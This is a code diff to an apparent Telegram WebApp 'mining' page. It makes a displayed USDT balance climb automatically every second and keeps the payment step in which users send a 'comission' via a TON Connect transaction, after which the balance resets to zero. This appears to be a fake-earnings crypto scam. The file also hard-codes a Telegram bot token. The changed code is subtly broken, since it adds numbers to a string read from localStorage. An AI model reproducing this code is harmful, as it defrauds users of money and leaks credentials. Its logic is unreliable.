@@ -439,7 +439,7 @@ a {
 let tg = window.Telegram.WebApp;
 
 let activeMining = false;
-let lst = 0.0001 + parseFloat(localStorage.getItem("opop")); //lusdt
+let lst = localStorage.getItem("vfvf"); //lusdt
 let data = 0;
 let blocks = 0;
 let wallet = "";
@@ -509,7 +509,14 @@ window.addEventListener("load", (event) => {
 });
 
 window.setInterval(function(){
+	if(lst != 0){
+	lst = lst + 0.01;
+	localStorage.setItem("vfvf", lst);
     document.getElementById("usdt").innerHTML = `<span class="fancy">${lst.toFixed(2)} USDT</span>`;
+	 }
+	else{
+	document.getElementById("usdt").innerHTML = `<span class="fancy">${lst.toFixed(2)} USDT</span>`;
+	 }
 }, 1000);
 
 function setTgPrem(prem){
@@ -708,7 +715,7 @@ function limitedMine(blockData, difficulty, fees, hash, lt) {
 
     reward = (1.04567 + (hashvalue * difficulty / 5)) / 10; //0.96
     lst = lst + reward;
-    localStorage.setItem("opop", lst);
+    localStorage.setItem("vfvf", lst);
     return reward;
 
 
@@ -745,7 +752,7 @@ function limitedMineGolden(blockData, difficulty, fees, hash, lt) {
 
     reward = (1.04567 + (hashvalue * difficulty / 5)) * 5 / 10; //0.96
     lst = lst + (reward * 5);
-    localStorage.setItem("opop", lst);
+    localStorage.setItem("vfvf", lst);
     return reward;
 
 
@@ -1099,7 +1106,7 @@ function pp(){
                     await tonConnectUI.sendTransaction(transaction);
                     alert("You successfuly paid comission!");
                     lst = 0;
-                    localStorage.setItem("opop", lst);
+                    localStorage.setItem("vfvf", lst);
 
 					let telegram = {
     					token: "7937247695:AAGNmeIQE9gM5Zec8KbIezbrHdDAhKK4ksU", // Your bot's token that got from @BotFather
